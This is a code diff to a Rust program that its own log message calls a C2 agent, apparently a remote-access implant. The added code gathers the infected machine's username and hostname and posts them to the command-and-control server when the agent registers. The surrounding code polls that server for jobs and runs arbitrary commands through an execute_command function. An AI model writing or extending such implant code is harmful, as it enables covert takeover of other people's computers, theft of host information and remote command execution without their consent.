@@ -34,9 +34,11 @@ fn main() {
         }
         Err(_) => {
             println!("Read failed, registering to c2");
+            let username = get_username();
+            let hostname = get_hostname();
             let id = ureq_agent
                 .post(format!("{API}/agents").as_str())
-                .call()
+                .send_json(ureq::json!({"username": username, "hostname": hostname}))
                 .unwrap()
                 .into_string()
                 .unwrap();
@@ -50,7 +52,7 @@ fn main() {
         }
     };
 
-    // Long pooling
+    // Short pooling
     loop {
         // Try to get a job
         match ureq_agent
@@ -85,4 +87,12 @@ fn main() {
 fn execute_command(command: String, args: Vec<String>) -> String{
   let output = process::Command::new(command).args(&args).output().expect("Failed to run command");
   String::from_utf8(output.stdout).expect("Failed to parse utf8 output")
+}
+
+fn get_username() -> String{
+  String::from_utf8(process::Command::new("whoami").output().expect("Failed to get username").stdout).expect("Failed to parse username")
+}
+
+fn get_hostname() -> String{
+  String::from_utf8(process::Command::new("hostname").output().expect("Failed to get hostname").stdout).expect("Failed to parse hostname")
 }
